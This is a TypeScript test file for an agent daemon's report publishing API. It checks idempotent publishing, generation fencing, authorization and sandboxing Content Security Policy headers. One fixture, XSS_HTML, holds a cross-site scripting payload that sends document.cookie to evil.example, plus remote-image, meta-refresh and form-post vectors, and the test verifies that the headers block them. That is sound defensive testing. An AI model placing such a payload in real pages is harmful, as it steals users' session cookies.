import { tmpDir } from "@pomtree/testing";
import assert from "node:assert/strict";
import { join } from "node:path";
import { test } from "node:test";
import type { AgentRecord, Report } from "@pomtree/core";
import { handle } from "./api.ts";
import { issueToken, issueUiCookie } from "./auth.ts";
import { REPORT_RENDER_CSP } from "./builtin/reports.ts";
import { listen } from "./server.ts";
import { SECRET, kinds, op, setup, spawnSpec } from "./test-setup.ts";
import { bearer, sockRequest } from "./test-http.ts";

test("publish happy path: slug, type, size, id, and a journal entry", async () => {
  let pub!: { status: number; body: { report: Report; replayed: boolean } };
  const t = setup(async (c) => {
    pub = (await c.api("POST", "/v1/agents/self/reports?name=notes.md&key=k1&generation=0", Buffer.from("# notes"))) as {
      status: number;
      body: { report: Report; replayed: boolean };
    };
    await c.api("POST", "/v1/agents/self/result", { result: { summary: "ok", value: 1 } });
  });
  const a = await t.spawn();
  await t.orchestrator.idle();
  assert.equal(pub.status, 201);
  assert.equal(pub.body.replayed, false);
  assert.equal(pub.body.report.name, "notes.md");
  assert.equal(pub.body.report.mediaType, "text/markdown");
  assert.equal(pub.body.report.sizeBytes, 7);
  assert.equal(pub.body.report.generation, 0);
  assert.equal(pub.body.report.host, "h1");
  assert.match(pub.body.report.id, /^[0-9a-f]{64}$/);
  const ev = await t.journal.read({ agent: a.id });
  assert.equal(kinds(ev).filter((k) => k === "ext.reports.report_published").length, 1);
  const list = (await t.operator("GET", `/v1/agents/${a.id}/reports`)).body as Report[];
  assert.equal(list.length, 1);
  assert.equal(list[0]!.id, pub.body.report.id);
});

test("a repeat publish is a replay and journals only once", async () => {
  let first!: { report: Report; replayed: boolean };
  let second!: { report: Report; replayed: boolean };
  const t = setup(async (c) => {
    first = (await c.api("POST", "/v1/agents/self/reports?name=r.html&key=k&generation=0", Buffer.from("<b>x</b>"))).body as {
      report: Report;
      replayed: boolean;
    };
    second = (await c.api("POST", "/v1/agents/self/reports?name=r.html&key=k&generation=0", Buffer.from("<b>x</b>"))).body as {
      report: Report;
      replayed: boolean;
    };
    await c.api("POST", "/v1/agents/self/result", { result: { summary: "ok", value: 1 } });
  });
  const a = await t.spawn();
  await t.orchestrator.idle();
  assert.equal(first.replayed, false);
  assert.equal(second.replayed, true);
  assert.equal(first.report.id, second.report.id);
  const ev = await t.journal.read({ agent: a.id });
  assert.equal(kinds(ev).filter((k) => k === "ext.reports.report_published").length, 1);
});

test("a stale-generation publish is rejected with 409", async () => {
  let status = 0;
  const t = setup(async (c) => {
    status = (await c.api("POST", "/v1/agents/self/reports?name=r.md&key=k&generation=5", Buffer.from("x"))).status;
    await c.api("POST", "/v1/agents/self/result", { result: { summary: "ok", value: 1 } });
  });
  await t.spawn();
  await t.orchestrator.idle();
  assert.equal(status, 409);
});

test("a missing generation is rejected with 400", async () => {
  let status = 0;
  const t = setup(async (c) => {
    status = (await c.api("POST", "/v1/agents/self/reports?name=r.md&key=k", Buffer.from("x"))).status;
    await c.api("POST", "/v1/agents/self/result", { result: { summary: "ok", value: 1 } });
  });
  await t.spawn();
  await t.orchestrator.idle();
  assert.equal(status, 400);
});

test("publish requires a running, known agent", async () => {
  const t = setup(async () => {});
  const a = await t.spawn();
  await t.orchestrator.idle(); // root reaps its child -> reaped
  const body = Buffer.from("x");
  await assert.rejects(
    () => t.reportsExt.publish(a.id, { name: "r", key: "k", content: body }),
    (e: unknown) => (e as { status?: number }).status === 409,
  );
  // A issued token whose agent no longer exists surfaces as 404.
  const ghost = await handle(t.daemon, {
    method: "POST",
    url: "/v1/agents/self/reports?name=r&key=k&generation=0",
    body,
    token: issueToken(SECRET, { scope: "agent", agent: "nope", generation: 0, expiry: Date.now() + 60_000 }),
  });
  assert.equal(ghost.status, 404);
  // The reaped agent's own token still fences on state, not just generation.
  const reaped = await handle(t.daemon, { method: "POST", url: "/v1/agents/self/reports?name=r&key=k&generation=0", body, token: t.daemon.agentToken(a.id) });
  assert.equal(reaped.status, 409);
});

test("report list/read/remove authorization (operator vs self/child vs peer)", async () => {
  let bId = "";
  const t = setup(async (c) => {
    if (c.prompt === "b") {
      await c.api("POST", "/v1/agents/self/reports?name=b.md&key=bk&generation=0", Buffer.from("b report"));
      await c.api("POST", "/v1/agents/self/result", { result: { summary: "ok", value: "b done" } });
      return;
    }
    await c.api("POST", "/v1/agents/self/reports?name=a.md&key=ak&generation=0", Buffer.from("a report"));
    const r = await c.api("POST", "/v1/agents", { task: "b", idempotencyKey: "b" });
    bId = (r.body as AgentRecord).id;
    await c.api("GET", `/v1/agents/${bId}/wait?timeoutMs=2000`);
    await c.api("POST", `/v1/agents/${bId}/reap`);
    await c.api("POST", "/v1/agents/self/result", { result: { summary: "ok", value: "a done" } });
  });
  const a = await t.spawn();
  const aId = a.id;
  await t.orchestrator.idle();

  const aTok = t.daemon.agentToken(aId);
  const bTok = t.daemon.agentToken(bId);
  const call = (token: string | undefined, method: string, url: string) => handle(t.daemon, { method, url, token }).then((r) => r.status);

  const all = (await t.operator("GET", "/v1/reports")).body as { report: Report; agent: string }[];
  assert.equal(all.length, 2);
  assert.deepEqual(new Set(all.map((x) => x.agent)), new Set([aId, bId]));

  const aReports = (await t.operator("GET", `/v1/agents/${aId}/reports`)).body as Report[];
  assert.equal(aReports.length, 1);
  const aRid = aReports[0]!.id;

  // Self and child may list/read; a peer may not.
  assert.equal(await call(aTok, "GET", `/v1/agents/${aId}/reports`), 200);
  assert.equal(await call(aTok, "GET", `/v1/agents/${bId}/reports`), 200);
  assert.equal(await call(bTok, "GET", `/v1/agents/${aId}/reports`), 403);
  assert.equal(await call(aTok, "GET", `/v1/agents/${aId}/reports/${aRid}`), 200);
  assert.equal(await call(bTok, "GET", `/v1/agents/${aId}/reports/${aRid}`), 403);

  // Delete is operator-only.
  assert.equal(await call(aTok, "DELETE", `/v1/agents/${aId}/reports/${aRid}?key=d1`), 403);
  assert.equal((await t.operator("DELETE", `/v1/agents/${aId}/reports/${aRid}?key=d1`)).status, 200);
  assert.equal(((await t.operator("GET", `/v1/agents/${aId}/reports`)).body as Report[]).length, 0);
});

test("the report publish route caps the raw body at reportMaxBytes", async () => {
  const t = setup(async () => {}, {}, {}, { reportMaxBytes: 4 });
  const root = await t.daemon.root();
  const sock = join(tmpDir("pomtreed-"), "s.sock");
  const server = await listen(t.daemon, sock);
  const post = (path: string, payload: Buffer, token: string) => sockRequest(sock, path, { method: "POST", headers: bearer(token), payload });
  try {
    const tok = t.daemon.agentToken(root.id);
    assert.equal((await post("/v1/agents/self/reports?name=r&key=k&generation=0", Buffer.from("12345"), tok)).status, 413);
    assert.equal((await post("/v1/agents/self/reports?name=r&key=k&generation=0", Buffer.from("1234"), tok)).status, 201);
  } finally {
    server.close();
  }
});

test("a report whose journal write crashed is journaled on replay", async () => {
  const t = setup(async () => {});
  const root = await t.daemon.root();
  const a = await t.daemon.deps.registry.create({
    spec: spawnSpec,
    parent: root.id,
    name: "a",
    task: "t",
    host: "h1",
    budgetMicros: 1_000,
    idempotencyKey: "a",
  });
  await t.daemon.deps.registry.transition(a.id, a.generation, "running", { idempotencyKey: "a-run" });

  const rawJournal = t.fakes.hooks.raw.journal;
  const base = rawJournal.append.bind(rawJournal);
  let crashed = false;
  rawJournal.append = async (e) => {
    if (!crashed && e.payload.kind === "ext.reports.report_published") {
      crashed = true;
      throw new Error("boom");
    }
    return base(e);
  };

  // The store write lands, then the journal write throws (a crash between the two).
  await assert.rejects(() => t.reportsExt.publish(a.id, { name: "r.md", key: "k", generation: a.generation, content: Buffer.from("x") }), /boom/);
  assert.equal((await t.fakes.reportStore.list(a.id)).length, 1);
  assert.equal((await t.journal.read({ agent: a.id })).filter((e) => e.payload.kind === "ext.reports.report_published").length, 0);

  // A replay must still journal the report (idempotent key) instead of skipping on `prior`.
  const out = await t.reportsExt.publish(a.id, { name: "r.md", key: "k", generation: a.generation, content: Buffer.from("x") });
  assert.equal(out.replayed, true);
  assert.equal((await t.journal.read({ agent: a.id })).filter((e) => e.payload.kind === "ext.reports.report_published").length, 1);
});

test("raw report responses are nosniff, sandboxed, and downloaded as attachment", async () => {
  let reportId = "";
  const t = setup(async (c) => {
    const r = await c.api("POST", "/v1/agents/self/reports?name=r.html&key=k&generation=0", Buffer.from("<script>1</script>"));
    reportId = (r.body as { report: Report }).report.id;
    await c.api("POST", "/v1/agents/self/result", { result: { summary: "ok", value: 1 } });
  });
  const a = await t.spawn();
  await t.orchestrator.idle();
  const sock = join(tmpDir("pomtreed-"), "s.sock");
  const server = await listen(t.daemon, sock);
  const get = (path: string, token: string) => sockRequest(sock, path, { headers: bearer(token) });
  try {
    const res = await get(`/v1/agents/${a.id}/reports/${reportId}?raw=1`, op);
    assert.equal(res.status, 200);
    assert.equal(res.headers["x-content-type-options"], "nosniff");
    assert.equal(res.headers["content-security-policy"], "sandbox");
    assert.equal(res.headers["content-disposition"], "attachment");
  } finally {
    server.close();
  }
});

test("an unauthenticated report publish is rejected before the body is read", async () => {
  const t = setup(async () => {}, {}, {}, { reportMaxBytes: 4 });
  await t.daemon.root();
  const sock = join(tmpDir("pomtreed-"), "s.sock");
  const server = await listen(t.daemon, sock);
  const post = (path: string, payload: Buffer, token?: string) => sockRequest(sock, path, { method: "POST", headers: bearer(token), payload });
  try {
    // Invalid token + an oversized body: 401, not 413 — the body is never read.
    assert.equal((await post("/v1/agents/self/reports?name=r&key=k&generation=0", Buffer.from("12345"), "bogus")).status, 401);
  } finally {
    server.close();
  }
});

const XSS_HTML = `<script>fetch("https://evil.example/?c="+document.cookie)</script><img src=x onerror="alert(1)"><img src="https://evil.example/p.png"><meta http-equiv="refresh" content="0;url=https://evil.example"><form action="https://evil.example" method="post"><input name=a></form>`;

test("render endpoint: inline, locked CSP, auth + 404; download path stays attachment; XSS fixture is blocked at header level", async () => {
  let htmlId = "",
    mdId = "";
  const t = setup(async (c) => {
    const r = await c.api("POST", "/v1/agents/self/reports?name=x.html&key=k&generation=0", Buffer.from(XSS_HTML));
    htmlId = (r.body as { report: Report }).report.id;
    const m = await c.api("POST", "/v1/agents/self/reports?name=x.md&key=k2&generation=0", Buffer.from("# hi"));
    mdId = (m.body as { report: Report }).report.id;
    await c.api("POST", "/v1/agents/self/result", { result: { summary: "ok", value: 1 } });
  });
  const a = await t.spawn();
  await t.orchestrator.idle();
  const sock = join(tmpDir("pomtreed-"), "s.sock");
  const server = await listen(t.daemon, sock);
  const get = (path: string, headers: Record<string, string>) => sockRequest(sock, path, { headers });
  try {
    const cookie = { cookie: issueUiCookie(SECRET, 60_000) };
    const path = `/v1/agents/${a.id}/reports/${htmlId}/render`;
    const res = await get(path, cookie);
    assert.equal(res.status, 200);
    assert.equal(
      res.headers["content-security-policy"],
      "sandbox; default-src 'none'; style-src 'unsafe-inline'; img-src data:; font-src data:; base-uri 'none'; form-action 'none'; frame-ancestors 'self'",
    );
    assert.equal(res.headers["content-security-policy"], REPORT_RENDER_CSP);
    assert.equal(res.headers["content-type"], "text/html; charset=utf-8");
    assert.equal(res.headers["content-disposition"], undefined);
    assert.equal(res.headers["x-frame-options"], undefined);
    assert.equal(res.headers["x-content-type-options"], "nosniff");
    assert.equal(res.headers["referrer-policy"], "no-referrer");
    assert.equal(res.headers["cross-origin-resource-policy"], "same-origin");
    assert.equal(res.headers["cache-control"], "no-store");
    // XSS fixture, header level: the CSP must (a) sandbox (no script/forms/top-nav/popups, opaque origin),
    // (b) have no script-src/connect-src grant (default-src 'none' => inline script, onerror, fetch blocked),
    // (c) allow images only from data: (remote <img> blocked), (d) forbid form posts, (e) forbid <base>.
    // <meta refresh> navigation is covered by the sandbox (no top navigation) and default-src/form-action 'none'.
    const csp = res.headers["content-security-policy"] as string;
    const dirs = new Map(
      csp
        .split(";")
        .map((d) => d.trim())
        .filter(Boolean)
        .map((d) => {
          const [k, ...v] = d.split(/\s+/);
          return [k!, v.join(" ")];
        }),
    );
    assert.ok(dirs.has("sandbox"));
    assert.equal(dirs.get("sandbox"), "");
    assert.equal(dirs.get("default-src"), "'none'");
    assert.ok(!dirs.has("script-src") && !dirs.has("connect-src") && !dirs.has("frame-src") && !dirs.has("navigate-to"));
    assert.equal(dirs.get("img-src"), "data:");
    assert.equal(dirs.get("form-action"), "'none'");
    assert.equal(dirs.get("base-uri"), "'none'");
    assert.ok(!csp.includes("allow-") && !csp.includes("unsafe-eval") && !/script-src[^;]*unsafe-inline/.test(csp));

    assert.equal((await get(path, {})).status, 401);
    assert.equal((await get(`/v1/agents/${a.id}/reports/nope/render`, cookie)).status, 404);
    assert.equal((await get(`/v1/agents/${a.id}/reports/${mdId}/render`, cookie)).status, 415);

    const dl = await get(`/v1/agents/${a.id}/reports/${htmlId}?raw=1`, cookie);
    assert.equal(dl.headers["content-disposition"], "attachment");
    assert.equal(dl.headers["content-security-policy"], "sandbox");

    // The UI shell CSP gains frame-src 'self' and 'self' for script-src/style-src (vendored xterm).
    const ui = await get("/ui", cookie);
    const uiCsp = ui.headers["content-security-policy"] as string;
    assert.ok(uiCsp.includes("frame-src 'self';"));
    assert.ok(uiCsp.includes("script-src 'self' 'unsafe-inline';")); // 'self' for the vendored xterm.js
    assert.ok(uiCsp.includes("default-src 'none'") && uiCsp.includes("frame-ancestors 'none'"));
    assert.ok(!/frame-src[^;]*(\*|https?:|data:)/.test(uiCsp));
  } finally {
    server.close();
  }
});
